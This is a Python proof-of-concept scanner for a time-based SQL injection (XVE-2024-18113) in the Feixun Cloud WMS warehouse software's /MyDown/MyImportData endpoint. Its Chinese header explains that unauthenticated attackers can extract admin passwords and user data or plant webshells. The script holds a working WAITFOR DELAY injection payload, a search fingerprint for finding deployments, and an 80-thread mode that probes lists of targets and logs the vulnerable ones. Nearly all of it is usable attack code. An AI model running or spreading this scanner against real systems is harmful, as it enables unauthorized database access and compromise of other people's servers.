# -*- coding: utf-8 -*-
# 飞讯云-WMS /MyDown/MyImportData 前台SQL注入漏洞(XVE-2024-18113)
# body="wx8ccb75857bd3e985"
# 产品简介:云WMS仓库管理系统是一款标准化、智能化过程导向管理的仓库管理软件，它结合了众多知名企业的实际情况和管理经验，能够准确、高效地管理跟踪客户订单、采购订单、以及制令单的仓库管理需求。使用后，仓库管理模式发生了彻底的转变。从传统的“结果导向”转变成“过程导向”；从“数据录入”转变成“数据采集”；从“列表查询”到“可视化查询”；同时引入了“任务平台”让管理更加高效、快捷。二维码管理实现也是仓管业务的管控与追溯，过程精细可控，结果自然正确无误。
# 漏洞概述:飞讯云-WMS /MyDown/MyImportData 接口处存在前台SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
\x1b[38m██╗  ██╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗       ██╗ █████╗  ██╗ ██╗██████╗ 
\x1b[36m╚██╗██╔╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ███║██╔══██╗███║███║╚════██╗
\x1b[34m ╚███╔╝ ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗╚██║╚█████╔╝╚██║╚██║ █████╔╝
\x1b[35m ██╔██╗ ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝ ██║██╔══██╗ ██║ ██║ ╚═══██╗
\x1b[31m██╔╝ ██╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║       ██║╚█████╔╝ ██║ ██║██████╔╝
\x1b[33m╚═╝  ╚═╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝       ╚═╝ ╚════╝  ╚═╝ ╚═╝╚═════╝ 
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>                                                                                                                                                 
    --author:Kucei  --Version:飞讯云-WMS /MyDown/MyImportData 前台SQL注入漏洞(XVE-2024-18113)
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<                                              
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('飞讯云-WMS_/MyDown/MyImportData_前台SQL注入漏洞(XVE-2024-18113)')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload1 = "/MyDown/MyImportData?opeid=1"
    url_payload2 = "/MyDown/MyImportData?opeid=1%27+WAITFOR+DELAY+'0:0:5'--"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = {}
    try :
        response1 = requests.get(url=target+url_payload1,headers=headers,verify=False,timeout=7)
        response2 = requests.get(url=target+url_payload2,headers=headers,verify=False,timeout=7)
        # print(response.status_code)
        # print(response.text)
        time1 = response1.elapsed.total_seconds()
        time2 = response2.elapsed.total_seconds()
        if response1.status_code == 200 and time2 - time1 >= 4.5:
            print( f"[+] {target} 存在漏洞！\n")
            with open('XVE-2024-18113.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload2+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()